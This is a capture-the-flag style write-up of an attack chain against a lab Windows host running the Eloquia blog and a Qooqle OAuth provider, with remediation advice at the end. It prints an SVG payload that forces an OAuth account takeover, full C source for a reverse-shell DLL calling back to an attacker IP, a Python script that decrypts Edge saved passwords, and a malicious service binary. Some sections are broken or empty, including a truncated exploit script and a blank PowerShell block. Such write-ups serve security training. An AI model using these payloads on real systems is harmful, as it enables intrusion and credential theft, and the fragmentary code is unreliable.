## Executive Summary

This assessment demonstrates a full attack chain against a Windows web server running a custom blogging platform called **Eloquia** and an OAuth provider called **Qooqle**. The exploitation path chains four distinct techniques:

- **XSS via CVE-2025-2336** — An `ngSanitize` bypass in AngularJS 1.8.2 that allows `<svg><image xlink:href="...">` to bypass the sanitizer without user interaction.
- **OAuth Account Takeover (CSRF-style)** — The short-lived OAuth callback code is embedded in the SVG payload; when the admin bot reviews the flagged article, it involuntarily associates its own Eloquia account with the attacker's Qooqle account, effectively handing over admin privileges.
- **SQLite `load_extension()` RCE** — Admin access exposes an unrestricted SQL playground and an unrestricted file upload; a malicious DLL is uploaded and loaded through SQLite's extension mechanism, spawning a reverse shell.
- **Privilege Escalation via Writable Service Binary** — A custom Windows service (`Failure2Ban`) runs as SYSTEM, and its binary directory is world-writable for the lateral-movement user `Olivia.KAT`. Replacing the binary with a crafted executable copies the root flag.

## OAuth Setup — Linking Accounts

### Understanding Qooqle

Qooqle is a custom-built identity provider (IdP) modelled after Google Accounts. It provides an account portal and an OAuth 2.0 authorization server. Third-party applications (like Eloquia) can delegate authentication to Qooqle — a user clicks "Log In with Qooqle," approves the permission grant on Qooqle, and is sent back to Eloquia via an OAuth callback URL containing a short-lived authorization `code`.

<img src="assets/img/eloquia/qooqle.png" alt="error loading image">

Register a new account at `http://qooqle.htb/register/`:

<img src="assets/img/eloquia/qooqle_register.png" alt="error loading image">

Log into the newly created Qooqle account at `http://qooqle.htb/login`:

<img src="assets/img/eloquia/qooqle_profile.png" alt="error loading image">

### Linking the Qooqle Account to Eloquia

Back in Eloquia under **Connected Accounts**, click **change**. The browser is sent to Qooqle's consent screen, which asks permission for Eloquia to read the user's Qooqle account data. Clicking **Authorize** completes the grant.

<img src="assets/img/eloquia/qooqle_authorize.png" alt="error loading image">

After authorization, Qooqle redirects the browser back to Eloquia using the **callback URL** — this is a critical OAuth concept:

```
http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=7jTaQfC6hIrZU2NnpozgkHYL50pPDp
```

The `code` parameter is a **one-time-use, short-lived authorization code** (approximately 15 seconds). When Eloquia's backend receives this URL, it exchanges the `code` with Qooqle for an access token and uses that token to fetch the user's Qooqle profile, permanently associating it with the currently logged-in Eloquia account.

**Key insight for exploitation:** Whoever's browser follows this callback URL is the Eloquia user that gets linked to the Qooqle account. If an admin's browser can be made to follow *our* callback code, the admin's Eloquia account will be linked to *our* Qooqle account — effectively granting us admin login via "Log In with Qooqle."

<img src="assets/img/eloquia/eloquia_connect.png" alt="error loading image">

The Qooqle account is now linked. Logging out of Eloquia and clicking **Log In with Qooqle** confirms the flow works end-to-end.

A standard script-tag payload is immediately stripped:

The `<image xlink:href="...">` causes the browser to silently make a GET request to the `href` URL when rendering the SVG, **without any user interaction** — not even a click.

### CVE-2025-2336 — AngularJS ngSanitize SVG Image Bypass

#### Vulnerability Overview

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2025-2336 |
| **Component** | AngularJS `ngSanitize` module (`$sanitize` service) |
| **Affected Versions** | AngularJS ≥ 1.3.1 |
| **Vulnerability Type** | Improper Sanitization / Content Security Bypass |
| **Impact** | Attacker-controlled URL is fetched server-side/client-side without user interaction |

#### Technical Details

The `$sanitize` service in AngularJS parses and reconstructs HTML to remove potentially dangerous elements. The service maintains an internal **whitelist of known safe elements and attributes**. For SVG elements, `ngSanitize` applies special handling: it recognizes `<image>` in SVG context and is supposed to treat it the same as `<img>` — requiring the `src` attribute to be validated.

The bug in CVE-2025-2336 is that the sanitizer **fails to detect SVG `<image>` elements** as image references when the `xlink:href` attribute is used instead of `src`. As a result:

1. The `<svg>` block passes through the sanitizer largely intact because SVG elements are generally considered safe markup containers.
2. The `<image xlink:href="attacker-url">` child element is not flagged — the sanitizer does not recognize `xlink:href` on `<image>` as an outbound network request trigger.
3. When the sanitized HTML is rendered in the browser, the SVG renderer processes `<image xlink:href="...">` by making an HTTP GET request to the specified URL — this happens automatically on page load, no click required.

The **Content Security Policy (CSP)** on Eloquia blocks JavaScript execution functions like `alert()` and `eval()`, preventing classic script-based XSS. But the SVG image bypass does not require JavaScript — it works purely via an HTML attribute that causes a passive HTTP request, which is permitted even under strict CSP.

For a deep technical analysis of the vulnerability, refer to the writeup by [George Kalpakas on HeroDevs](https://www.herodevs.com/vulnerability-directory/cve-2025-2336?nes-for-angularjs).

## Admin Panel Takeover — CVE-2025-2336 + OAuth CSRF

### Attack Concept

The attack chains the SVG bypass with the OAuth account-linking mechanism:

1. Generate a fresh OAuth callback URL (our Qooqle account → Eloquia callback code).
2. Embed that callback URL inside an SVG `<image xlink:href="...">` payload in an article.
3. Report the article to trigger admin-bot review.
4. The admin bot opens the article; the SVG causes the admin bot's browser to silently GET the callback URL.
5. Eloquia's server receives the callback request **authenticated as the admin**, and links the admin's Eloquia account to our Qooqle account.
6. We log in via "Log In with Qooqle" using our Qooqle account and gain admin access.

### Step-by-Step Manual Method

**Prerequisite:** Ensure your Eloquia account is already linked to your Qooqle account (setup completed above).

1. **Capture a fresh OAuth code.** Log out of Eloquia, enable Burp Proxy intercept, and click **Log In with Qooqle**. Intercept the callback redirect to capture the `code` parameter:

```
http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=7jTaQfC6hIrZU2NnpozgkHYL50pPDp
```

2. **Create an article with the SVG payload.** Paste this into the article editor, substituting your captured code:

```html
<svg xmlns="http://www.w3.org/2000/svg" 
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://eloquia.htb/accounts/oauth2/qooqle/callback/?code=snlZ6bCC1EhmF0JVXJr1exRI9fSQh5" width="100" height="100"/>
</svg>
```

3. **Report the article immediately** to send it to the admin review queue.

4. **Log out** of Eloquia, then log back in using **Log In with Qooqle**. If the admin bot visited in time, you will be authenticated as the admin user.

**Timing Challenge:** OAuth authorization codes expire in approximately **15 seconds**. The manual approach is very difficult to execute within this window. Use the automated script below.

### Automated Exploit Script

The script automates all phases of the attack: authenticates to both Eloquia and Qooqle, generates a fresh OAuth code, embeds it in an article, reports the article, and then polls for admin access — all within the 15-second expiry window.

**Note:** Update the credentials at the top of the script before running.

```python
def login_eloquia():
    """Create logged-in session to Eloquia"""
    session = requests.Session()
    resp = session.get(f"{TARGET}/accounts/login/")
    match = re.search(r'csrfmiddlewaretoken["\s]+value="([^"]+)"', resp.text)

        return None
    
    code = query_params['code'][0]
```

### SQLite `load_extension()` — DLL Injection

#### Confirming Extension Loading is Permitted

#### Malicious DLL — Reverse Shell

The following C code implements a Windows reverse shell packaged as a SQLite extension DLL. SQLite calls the `sqlite3_extension_init` entry point when loading an extension. We spawn a new Windows thread from this entry point, which connects back to our listener and hands `cmd.exe` over the socket:

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

typedef struct sqlite3 sqlite3;
typedef struct sqlite3_api_routines sqlite3_api_routines;
const sqlite3_api_routines *sqlite3_api = 0;
#define SQLITE_EXTENSION_INIT2(v) (sqlite3_api = (v))
#define SQLITE_OK_LOAD_PERMANENTLY 256

DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET winSock;
    struct sockaddr_in sockAddr;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    
    
    int port = 4444; // Port
    char *ip = "10.10.14.74"; // IP

    
    WSAStartup(MAKEWORD(2,2), &wsaData);
    winSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    
    sockAddr.sin_family = AF_INET;
    sockAddr.sin_port = htons(port);
    sockAddr.sin_addr.s_addr = inet_addr(ip);
    
    WSAConnect(winSock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);
    
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError  = (HANDLE)winSock;
    sinfo.hStdInput  = (HANDLE)winSock;
    sinfo.hStdOutput = (HANDLE)winSock;
    
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
    
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(winSock);
    WSACleanup();
    
    return 0;
}

#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_extension_init(
    sqlite3 *db, 
    char **pzErrMsg, 
    const sqlite3_api_routines *pApi
) {
    SQLITE_EXTENSION_INIT2(pApi);
    CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    return SQLITE_OK_LOAD_PERMANENTLY;
}
```

**Code walkthrough:**
- `sqlite3_extension_init` is the **mandatory entry point** that SQLite calls immediately upon `load_extension()`. It receives a pointer to SQLite's internal API and a database handle.
- `SQLITE_EXTENSION_INIT2(pApi)` stores the API pointer globally, satisfying SQLite's internal bookkeeping.
- `CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL)` launches the reverse shell logic in a **separate thread** so `sqlite3_extension_init` can return promptly (keeping the database connection alive).
- The return value `SQLITE_OK_LOAD_PERMANENTLY` tells SQLite to keep the extension loaded for the lifetime of the database connection rather than unloading it after the call returns.
- The `ReverseShell` thread uses the Windows Sockets API (`WSASocket`, `WSAConnect`) to establish a TCP connection to the attacker, then calls `CreateProcessA` to spawn `cmd.exe` with all three standard handles (`stdin`, `stdout`, `stderr`) redirected to the socket.

### Edge Credential Extraction

Chromium-based browsers encrypt stored passwords using a two-layer scheme:

1. **Master key derivation:** The browser generates a random AES-256 key and encrypts it using the **Windows Data Protection API (DPAPI)**. The DPAPI-encrypted blob is then base64-encoded and stored in a JSON file called `Local State` at:
   `%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State`

2. **Password encryption:** Each saved password is encrypted with **AES-256-GCM** using the master key. The ciphertext, IV, and authentication tag are stored in a SQLite database file called `Login Data` at:
   `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data`

**DPAPI security model:** DPAPI ties encryption to the **user's login credentials**. Decryption succeeds only when running in the context of the same user who encrypted the data (or an administrator). Because our shell runs as `web`, and the `web` user's profile contains Edge data, we can decrypt the master key and all stored passwords within this session.

The decryption script below:
1. Reads `Local State`, extracts the base64-encoded encrypted master key, strips the 5-byte `DPAPI` prefix, and calls `CryptUnprotectData` via `pywin32` to decrypt it.
2. Connects to the `Login Data` SQLite file, queries the `logins` table, and for each entry decodes the v10/v11-format AES-GCM ciphertext (12-byte IV + ciphertext + 16-byte GCM tag) using the master key.

```python
import sqlite3
import base64
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def decrypt_edge_passwords(master_key_base64, login_data_path):
    """
    Decrypt Edge passwords from Login Data SQLite file
    
    Args:
        master_key_base64: Base64 encoded master key (from Local State file)
        login_data_path: Path to 'Login Data' SQLite file
        output_file: File to save decrypted passwords
    """
    
    try:
        # Decode the master key
        if isinstance(master_key_base64, str):
            master_key = base64.b64decode(master_key_base64)
        else:
            master_key = master_key_base64
        
        print(f"[INFO] Using master key (length: {len(master_key)} bytes)")
        
        # Connect to the SQLite database
        conn = sqlite3.connect(login_data_path)
        cursor = conn.cursor()
        
        # Query the logins table
        cursor.execute("""
            SELECT origin_url, username_value, password_value, date_created, date_last_used
            FROM logins
        """)
        
        logins = cursor.fetchall()
        print(f"[INFO] Found {len(logins)} login entries")
        
        decrypted_passwords = []
        
        for login in logins:
            origin_url, username, encrypted_password, date_created, date_last_used = login
            
            # Skip entries without passwords
            if not encrypted_password:
                continue
            
            try:
                # Convert bytes if it's a string
                if isinstance(encrypted_password, str):
                    encrypted_password = encrypted_password.encode('utf-8')
                
                # Get the first 3 bytes (version identifier)
                version = encrypted_password[:3]
                
                if version == b'v10' or version == b'v11':
                    # Chrome/Edge version 80+ encryption (AES-256-GCM)
                    # Structure: v10/v11 + iv (12 bytes) + ciphertext + tag (16 bytes)
                    
                    # Extract components
                    iv = encrypted_password[3:15]  # 12 bytes IV
                    ciphertext_with_tag = encrypted_password[15:]
                    
                    # Separate ciphertext and tag (last 16 bytes are tag)
                    ciphertext = ciphertext_with_tag[:-16]
                    tag = ciphertext_with_tag[-16:]
                    
                    # Create AES-GCM cipher
                    cipher = Cipher(
                        algorithms.AES(master_key),
                        modes.GCM(iv, tag),
                        backend=default_backend()
                    )
                    
                    # Decrypt
                    decryptor = cipher.decryptor()
                    password = decryptor.update(ciphertext) + decryptor.finalize()
                    
                else:
                    # Legacy Chrome/Edge encryption (DPAPI)
                    # Windows only - requires pywin32
                    try:
                        import win32crypt
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    except ImportError:
                        print("[WARNING] Legacy encryption detected but pywin32 not installed")
                        password = b"[LEGACY ENCRYPTION - Requires Windows]"
                    
            except Exception as e:
                password = f"[DECRYPTION ERROR: {str(e)}]".encode('utf-8')
            
            # Convert password to string
            try:
                password_str = password.decode('utf-8', errors='ignore')
            except:
                password_str = str(password)
            
            # Store the decrypted entry
            entry = {
                'url': origin_url,
                'username': username,
                'password': password_str,
                'created': date_created,
                'last_used': date_last_used
            }
            decrypted_passwords.append(entry)
            
            print(f"[SUCCESS] Decrypted: {origin_url} | User: {username}")
        
        # print to console
        print("\n" + "=" * 80)
        print("DECRYPTED PASSWORDS SUMMARY:")
        print("=" * 80)
        for entry in decrypted_passwords[:10]:  # Show first 10
            print(f"\nURL: {entry['url']}")
            print(f"Username: {entry['username']}")
            print(f"Password: {entry['password'][:50]}..." if len(entry['password']) > 50 else f"Password: {entry['password']}")
        
        if len(decrypted_passwords) > 10:
            print(f"\n... and {len(decrypted_passwords) - 10} more entries")
        
        conn.close()
        return decrypted_passwords
        
    except Exception as e:
        print(f"[ERROR] Failed to decrypt passwords: {e}")
        return []
```

### Malicious Service Binary — Flag Copy

Instead of attempting to spawn a reverse shell (which would be caught by Defender), we write a minimal C program that uses `CreateProcess` to call `cmd.exe /c copy` to copy the root flag to a world-readable location:

```c
#include <windows.h>
#include <stdio.h>

int main(void) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    
    LPSTR cmdLine = "C:\\Windows\\System32\\cmd.exe /c copy C:\\Users\\Administrator\\Desktop\\root.txt C:\\ProgramData\\root.txt";
    
    if (CreateProcess(
        NULL,                    // Application name (NULL means use command line)
        cmdLine,                 // Command line
        NULL,                    // Process security attributes
        NULL,                    // Thread security attributes
        FALSE,                   // Inherit handles
        0,                       // Creation flags
        NULL,                    // Environment
        NULL,                    // Current directory
        &si,                     // Startup info
        &pi                      // Process information
    )) {
        printf("Process created successfully!\n");
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("CreateProcess failed. Error: %lu\n", GetLastError());
    }
    
    return 0;
}
```

**Code explanation:**
- `ZeroMemory` — Initializes `STARTUPINFO` and `PROCESS_INFORMATION` structures to zero, required before `CreateProcess` use.
- `si.cb = sizeof(si)` — `STARTUPINFO` requires the `cb` field to be set to the structure's size.
- `cmdLine` — The command to run: `cmd.exe /c copy <source> <dest>`. Running as SYSTEM, this copies `root.txt` from Administrator's desktop (inaccessible to normal users) to `C:\ProgramData\root.txt` with permissions allowing all users to read it.
- `CreateProcess` — Creates a child process. `WaitForSingleObject` blocks until the child finishes, ensuring the copy completes before the service binary exits.
- `CloseHandle` — Properly releases process and thread handles.

Compile on Kali:

```shell
 x86_64-w64-mingw32-gcc read_root_flag.c -o flag.exe     
```

### Replacing the Service Binary

Transfer `flag.exe` to the target. Because the service may be actively running and holding a file lock on `Failure2Ban.exe`, use a loop that continuously attempts the overwrite until it succeeds (the service restarts or the file is momentarily unlocked):

```powershell

```

**Explanation:** The `while($true)` loop combined with `try/catch` retries the copy every iteration. `-Force` overwrites the destination file. `-ErrorAction Stop` converts the file-lock error (if any) into a catchable exception rather than a terminating error. When the service restarts its binary (or the OS briefly releases the lock during a restart cycle), the copy succeeds, the `break` exits the loop, and the next time the service starts it executes our `flag.exe` payload.

## Mitigations & Recommendations

### 1. Upgrade AngularJS — Remediate CVE-2025-2336

**Action:** Migrate away from AngularJS 1.x entirely. AngularJS 1.x reached End-of-Life (EOL) on December 31, 2021, and no longer receives security patches. Migrate to a modern framework (Angular 2+, React, Vue.js) or, at minimum, apply the HeroDevs NES (Never-Ending Support) patch for AngularJS 1.8.2.

If migration is not immediately feasible, implement a strict Content Security Policy as an additional defence layer:

```js
Content-Security-Policy: default-src 'self'; img-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'; frame-src 'none';
```

**Root Cause:** AngularJS 1.8.2's `ngSanitize` module failed to detect `<image xlink:href="...">` inside SVG elements as an outbound network request trigger, allowing an attacker to force the admin bot's browser to follow arbitrary URLs without user interaction — bypassing the sanitiser entirely.

---

### 2. Implement OAuth State Parameter (CSRF Protection)

**Action:** The OAuth 2.0 Authorization Code flow must include a cryptographically random `state` parameter that is validated on the callback. This prevents CSRF-style attacks where an attacker's authorization code is consumed by a victim's session.

```python
# Django OAuth — generating and validating the state parameter
import secrets

# On authorize redirect:
state = secrets.token_urlsafe(32)
request.session['oauth_state'] = state
redirect_url = f"https://qooqle.htb/authorize/?client_id=...&state={state}&redirect_uri=..."

# On callback:
if request.GET.get('state') != request.session.pop('oauth_state', None):
    return HttpResponseForbidden("Invalid OAuth state — potential CSRF attack")
```

**Root Cause:** The Eloquia OAuth callback endpoint (`/accounts/oauth2/qooqle/callback/`) did not validate a `state` parameter. Any browser that followed a callback URL with a valid `code` would have its session linked to the attacker's Qooqle account — regardless of who initiated the OAuth flow.

---

### 3. Disable SQLite `load_extension()` in Production

**Action:** Explicitly disable `load_extension()` at the application level. Django's default SQLite backend does not enable it, but if a custom SQL playground or API is exposed, it must be explicitly disabled:

```python
# Django settings.py — disable SQLite extension loading
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': BASE_DIR / 'db.sqlite3',
        'OPTIONS': {
            'init_command': 'SELECT 1',  # Placeholder; ensure no PRAGMA enabling extensions
        }
    }
}

# If using raw sqlite3 connections, NEVER call:
# connection.enable_load_extension(True)
```

Additionally, **remove the SQL Explorer from production entirely**. Developer tools that allow arbitrary SQL execution must never be exposed in a production deployment:

```python
# urls.py — disable SQL explorer in production
if settings.DEBUG:
    urlpatterns += [path('dev/sql-explorer/', include('explorer.urls'))]
```

**Root Cause:** The SQL Explorer at `/dev/sql-explorer/play/` allowed admin users to run unrestricted SQL queries, including `load_extension()`. Combined with the unrestricted file upload, this gave a direct code execution path — upload a malicious DLL as a banner image, then load it via SQLite.

---

### 4. Validate File Uploads — Enforce Allowlists

**Action:** Implement strict server-side file upload validation based on content type (magic bytes), file extension, and file size:

```python
# Django — validate uploaded banner images
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}
ALLOWED_MIME_TYPES = {'image/jpeg', 'image/png', 'image/gif', 'image/webp'}

def validate_banner(file):
    import magic
    ext = os.path.splitext(file.name)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValidationError(f"File extension '{ext}' is not allowed.")
    
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIME_TYPES:
        raise ValidationError(f"File type '{mime}' is not allowed.")
```

**Root Cause:** The admin article banner upload performed no validation on file type or extension. Any file — including DLLs, executables, and scripts — could be uploaded and stored in a web-accessible path (`static/assets/images/blog/`), enabling the SQLite `load_extension()` attack.

---

### 5. Restrict Admin Bot Review to Sandboxed Rendering

**Action:** The automated admin moderation bot (Selenium-based) should render reported articles in a sandboxed environment that blocks outbound network requests:

- Use a headless browser profile with a restrictive proxy that blocks all outbound traffic except to the application itself.
- Disable image loading in the review browser profile to prevent SVG `<image xlink:href="...">` exploitation.
- Run the bot with a dedicated, low-privilege account that has no admin capabilities — admin moderation actions should be queued for human review, not automatically applied by the bot's session.

```python
# Selenium — disable image loading in the review bot
chrome_options = Options()
chrome_options.add_argument("--headless")
prefs = {"profile.managed_default_content_settings.images": 2}  # Block images
chrome_options.add_experimental_option("prefs", prefs)
```

**Root Cause:** The admin bot reviewed flagged articles using a full browser session authenticated as `admin`. When the bot rendered the SVG payload, it silently followed the embedded OAuth callback URL, linking the admin's Eloquia account to the attacker's Qooqle account.

---

### 6. Remove Hardcoded Credentials from Automation Scripts

**Action:** Replace hardcoded credentials in the Selenium bot script with a secrets manager, environment variables, or Windows Credential Manager:

```python
# BAD: hardcoded credentials in script
payload = {"username": "admin", "password": "MyEl0qu!@Admin"}

# GOOD: use environment variables or a secrets manager
import os
payload = {
    "username": os.environ["ELOQUIA_BOT_USER"],
    "password": os.environ["ELOQUIA_BOT_PASS"],
}
```

**Root Cause:** The Selenium moderation bot at `C:\Program Files\Automation Scripts\seleniumSimulator.py` contained hardcoded admin credentials (`admin:MyEl0qu!@Admin`) in plaintext. Any user with filesystem access to the server could read these credentials.

### 7. Protect Browser Credential Stores — Restrict Profile Access

**Action:** Ensure user profile directories are not accessible to service accounts. The `web` service account should not have access to `Olivia.KAT`'s Edge user data:

```powershell
# Restrict Olivia.KAT's profile to only her SID
icacls "C:\Users\Olivia.KAT" /inheritance:r /grant "ELOQUIA\Olivia.KAT:(OI)(CI)(F)" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)(F)" /grant "BUILTIN\Administrators:(OI)(CI)(F)"
```

Additionally, enforce Application-Bound Encryption (Edge 127+) and consider deploying a password manager instead of browser-based credential storage for sensitive accounts.

**Root Cause:** The `web` service account had read access to its own Edge profile, which contained stored credentials for `Olivia.KAT`. Chromium-based browsers encrypt passwords with DPAPI, but any process running under the same user context can decrypt them.

### 8. Fix Service Binary Permissions — Writable Failure2Ban Directory

**Action:** Remove write permissions for non-administrative users from the Failure2Ban service binary directory:

```powershell
# Remove Olivia.KAT's write access to the service binary directory
icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug" /remove:g "ELOQUIA\Olivia.KAT"

# Grant only read+execute
icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug" /grant "ELOQUIA\Olivia.KAT:(OI)(CI)(RX)"
```

Additionally, deploy the service from a **Release build** rather than a `Debug` directory, and store the binary in a standard location under `C:\Program Files\` with default restrictive ACLs.

**Root Cause:** The `Failure2Ban` service ran as `NT AUTHORITY\SYSTEM`, but its binary resided in a development (`bin\Debug`) directory where `Olivia.KAT` had **Write** permissions. Overwriting the binary with a malicious executable resulted in SYSTEM-level code execution when the service restarted.

### 9. Deploy the Failure2Ban Service with Proper Service Hardening

**Action:** Apply defence-in-depth to the Failure2Ban Windows service:

- **Run as a least-privilege service account** — Use a gMSA or a dedicated service account instead of `NT AUTHORITY\SYSTEM`.
- **Enable service binary path integrity** — Use Windows Defender Application Control (WDAC) or AppLocker to enforce code signing on service binaries.
- **Monitor service binary modifications** — Use Sysmon Event ID 11 (FileCreate) or Windows Security Event ID 4663 (File Write) to alert on changes to service binary paths.

```powershell
# Change service account from SYSTEM to a dedicated gMSA
sc.exe config "Failure2Ban" obj= "ELOQUIA\svc_failure2ban$"
```

**Root Cause:** The Failure2Ban service ran with the highest possible Windows privilege level (`NT AUTHORITY\SYSTEM`) despite only needing log parsing and firewall rule capabilities. A compromised binary in this context grants full system control.

---

### 10. Implement Network Segmentation for Web Applications

**Action:** The web server hosting Eloquia should be deployed in a DMZ or isolated network segment with no direct access to internal services (WinRM, SMB) or user workstations. Lateral movement from the `web` service account to `Olivia.KAT` via browser credential theft was possible because the application server doubled as a user workstation.

- Separate application hosting from user workstations.
- Restrict WinRM (port 5985) access to management networks only.
- Deploy the web application in a containerised or sandboxed environment to limit post-exploitation impact.
